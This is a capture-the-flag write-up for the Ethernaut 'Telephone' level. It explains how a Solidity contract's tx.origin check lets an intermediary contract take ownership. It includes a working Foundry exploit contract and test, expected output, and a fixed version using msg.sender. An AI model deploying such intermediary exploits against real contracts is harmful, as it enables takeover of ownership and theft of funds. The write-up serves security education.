# Ethernaut Level 4: Telephone

## Challenge Description
Claim ownership of the contract below to complete this level.

**Difficulty:** ⭐ (Beginner)

**Goal:** Become the owner of the contract.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The contract uses tx.origin instead of msg.sender for access control!

Key Difference:
- msg.sender = The immediate caller of the function (could be a contract or EOA)
- tx.origin = The original EOA that started the transaction chain

The Check:
    if (tx.origin != msg.sender) {
        owner = _owner;
    }

This check PASSES when:
- tx.origin = Your EOA (you started the transaction)
- msg.sender = A contract (your exploit contract called changeOwner)

So if you call changeOwner() through an intermediate contract,
tx.origin != msg.sender, and the ownership changes!
```

## Exploit Strategy

```text
Step 1: Create an attacker contract that calls changeOwner()
   - When your EOA calls the attacker contract
   - tx.origin = Your EOA
   - msg.sender = Attacker contract

Step 2: The attacker contract calls target.changeOwner(yourAddress)
   - Inside changeOwner(): tx.origin (your EOA) != msg.sender (attacker contract)
   - Condition passes!
   - Owner is changed to your address

Step 3: Done! You're now the owner.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Telephone.sol";

contract TelephoneExploit {
    Telephone public target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function exploit(address _newOwner) public {
        // Call changeOwner through this contract
        // tx.origin = caller's EOA
        // msg.sender = this contract (TelephoneExploit)
        // tx.origin != msg.sender, so the check passes!
        target.changeOwner(_newOwner);
    }
}

contract TelephoneExploitTest is Test {
    Telephone public target;
    TelephoneExploit public attacker;
    address public attackerEOA = address(0xBEEF);

    function setUp() public {
        target = new Telephone();
        attacker = new TelephoneExploit(address(target));
        vm.deal(attackerEOA, 1 ether);
    }

    function test_ExploitTelephone() public {
        console.log("Initial owner:", target.owner());

        vm.startPrank(attackerEOA);

        // Call exploit function
        attacker.exploit(attackerEOA);

        vm.stopPrank();

        console.log("New owner:", target.owner());
        assertEq(target.owner(), attackerEOA, "Failed to become owner");

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitTelephone -vvv

# Expected output:
# [PASS] test_ExploitTelephone() (gas: 89012)
# Logs:
#   Initial owner: 0x5B3...
#   New owner: 0xBEEF...
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## Real-World Impact

```text
tx.origin vulnerabilities have led to MASSIVE hacks!

Famous Example:
- In 2017, a phishing attack used tx.origin to drain wallets
- Users were tricked into calling a malicious contract
- The malicious contract used tx.origin to bypass security checks
- Result: Millions of dollars stolen

Why tx.origin is Dangerous:
1. It breaks when contracts call other contracts
2. It enables phishing attacks through intermediate contracts
3. It violates the principle of least privilege
```

## How to Fix This Vulnerability

```solidity
// FIXED VERSION - Use msg.sender instead of tx.origin
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TelephoneFixed {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        // CORRECT: Use msg.sender for access control
        if (msg.sender == owner) {
            owner = _owner;
        }
    }

    // Or even better, use OpenZeppelin's Ownable:
    // function changeOwner(address _owner) public onlyOwner {
    //     owner = _owner;
    // }
}
```

## Key Takeaways
- **Never Use tx.origin for Access Control:** It's a security anti-pattern that enables phishing attacks.
- **Always Use msg.sender:** For checking who called a function, msg.sender is the correct choice.
- **tx.origin Has Legitimate Uses:** Rare cases like preventing contract-to-contract interactions, but even then, be careful.
- **Phishing Risk:** tx.origin vulnerabilities enable sophisticated phishing attacks through intermediate contracts.
- **Lesson Learned:** If you see tx.origin in a smart contract, it's almost always a bug. Replace it with msg.sender.
- **OpenZeppelin Ownable:** Use battle-tested access control patterns instead of custom implementations.